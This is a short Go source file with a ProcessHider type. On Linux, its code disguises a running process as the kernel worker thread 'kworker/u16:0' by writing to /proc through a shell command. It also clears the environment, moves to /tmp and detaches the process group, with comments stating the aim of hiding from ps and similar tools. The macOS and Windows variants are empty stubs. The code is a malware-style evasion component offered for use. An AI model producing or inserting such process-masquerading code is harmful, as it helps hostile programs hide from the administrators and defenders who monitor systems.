//go:build linux

package process

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func (p *ProcessHider) hideLinux() error {
	// Method 1: Change process name to something innocuous
	if err := p.changeProcessName("kworker/u16:0"); err != nil {
		return fmt.Errorf("failed to change process name: %w", err)
	}

	// Method 2: Try to remove from process list visibility
	// This attempts to make the process less visible to ps and other tools
	if err := p.hideFromProcfs(); err != nil {
		// Non-fatal error, continue with other methods
		fmt.Printf("Warning: failed to hide from procfs: %v\n", err)
	}

	return nil
}

func (p *ProcessHider) changeProcessName(newName string) error {
	// Use prctl to change the process name
	cmd := exec.Command("sh", "-c", fmt.Sprintf("echo '%s' > /proc/%d/comm", newName, p.pid))
	return cmd.Run()
}

func (p *ProcessHider) hideFromProcfs() error {
	// Attempt to make the process less visible by modifying its environment
	// This is a basic approach - more advanced techniques would require kernel modules

	// Clear environment variables that might give away the process identity
	os.Clearenv()

	// Change working directory to something innocuous
	if err := os.Chdir("/tmp"); err != nil {
		return fmt.Errorf("failed to change working directory: %w", err)
	}

	// Set process group to detach from parent
	if err := syscall.Setpgid(0, 0); err != nil {
		return fmt.Errorf("failed to set process group: %w", err)
	}

	return nil
}

func (p *ProcessHider) hideDarwin() error {
	return nil
}

func (p *ProcessHider) hideWindows() error {
	return nil
}
